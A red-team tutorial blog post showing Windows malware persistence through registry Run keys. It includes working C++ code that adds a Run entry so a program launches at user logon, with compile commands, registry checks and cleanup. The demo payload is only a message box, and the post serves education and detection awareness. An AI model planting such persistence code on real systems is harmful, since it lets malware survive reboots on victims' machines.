---
title:  "Malware development: persistence - part 1. Registry run keys. C++ example."
date:   2022-04-20 10:00:00 +0600
header:
  teaser: "/assets/images/51/2022-04-20_09-43.png"
categories:
  - tutorial
tags:
  - malware
  - windows
  - persistence
  - red team
  - win32api
---

ï·½

Hello, cybersecurity enthusiasts and white hackers!

![pers](/assets/images/51/2022-04-20_09-43.png){:class="img-responsive"}    

This post starts a series of articles on windows malware persistence techniques and tricks.    

Today I'll write about the result of my own research into the "classic" persistence trick: startup folder registry keys.    

### run keys

Adding an entry to the "run keys" in the registry will cause the app referenced to be executed when a user logs in. These apps will be executed under the context of the user and will have the account's associated permissions level.    

The following run keys are created by default on Windows Systems:    

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`    
![pers](/assets/images/51/2022-04-20_18-57.png){:class="img-responsive"}    

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`    
![pers](/assets/images/51/2022-04-20_18-58.png){:class="img-responsive"}    

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`    
![pers](/assets/images/51/2022-04-20_18-59.png){:class="img-responsive"}    

> Please note that this suggests to another trick to anti-VM (VirtualBox)    

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`    
![pers](/assets/images/51/2022-04-20_18-59_1.png){:class="img-responsive"}    

Threat actors can use these configuration locations to execute malware to maintain persistence through system reboots. Threat actors may also use masquerading to make the registry entries look as if they are associated with legitimate programs.    

### practical example

Let's go to look at a practical example. Let's say we have a *"malware"* `hack.cpp`:   

```cpp
/*
meow-meow messagebox
author: @cocomelonc
*/
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Let's go to compile it:   

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mwindows -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![pers](/assets/images/51/2022-04-20_19-08.png){:class="img-responsive"}    

And save it to folder `Z:\\2022-04-20-malware-pers-1\`:    

![pers](/assets/images/51/2022-04-20_19-10.png){:class="img-responsive"}    

Then, let's create a script `pers.cpp` that creates registry keys that will execute our program `hack.exe` when we log into Windows:    

```cpp
/*
pers.cpp
windows low level persistense via start folder registry key
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious app
  const char* exe = "Z:\\2022-04-20-malware-pers-1\\hack.exe";

  // startup
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }
  return 0;
}
```

As you can see, logic is simplest one. We just add new registry key. Registry keys can be added from the terminal to the run keys to achieve persistence, but since I love to write code, I wanted to show how to do it with some lines of code.    

### demo

Let's compile our `pers.cpp` script:   

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![pers](/assets/images/51/2022-04-20_19-20.png){:class="img-responsive"}    

Then, first of all, check registry keys in the victim's machine:    

```powershell
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](/assets/images/51/2022-04-20_09-35.png){:class="img-responsive"}    

Then, run our `pers.exe` script and check again:   

```powershell
.\pers.exe
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](/assets/images/51/2022-04-20_09-39.png){:class="img-responsive"}    

As you can see, new key added as expected.    
So now, check everything in action. Logout and login again:    

![pers](/assets/images/51/2022-04-20_09-40.png){:class="img-responsive"}    

![pers](/assets/images/51/2022-04-20_09-40_1.png){:class="img-responsive"}    

![pers](/assets/images/51/2022-04-20_09-44.png){:class="img-responsive"}    

Pwn! Everything is worked perfectly :)    

After the end of the experiment, delete the keys:    

```powershell
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "hack"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](/assets/images/51/2022-04-20_09-46.png){:class="img-responsive"}    

### windows 11

This trick is also work on `Windows 11`:

![pers](/assets/images/51/2022-04-21_10-29.png){:class="img-responsive"}    

![pers](/assets/images/51/2022-04-21_10-30.png){:class="img-responsive"}    

![pers](/assets/images/51/2022-04-21_10-30_1.png){:class="img-responsive"}    

![pers](/assets/images/51/2022-04-21_10-30_2.png){:class="img-responsive"}    

![pers](/assets/images/51/2022-04-21_10-31.png){:class="img-responsive"}    

And cleanup:

![pers](/assets/images/51/2022-04-21_10-32.png){:class="img-responsive"}    

### conclusion

Creating registry keys that will execute an malicious app during Windows logon is one of the oldest tricks in the red team playbooks. Various threat actors and known tools such as Metasploit, Powershell Empire provide this capability therefore a mature blue team specialists will be able to detect this malicious activity.

[RegOpenKeyEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)    
[RegSetValueEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)    
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)    
[Remove-ItemProperty](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-itemproperty?view=powershell-7.2)    
[reg query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)    
[source code in github](https://github.com/cocomelonc/2022-04-20-malware-pers-1)    

> This is a practical case for educational purposes only.      

Thanks for your time happy hacking and good bye!   
*PS. All drawings and screenshots are mine*
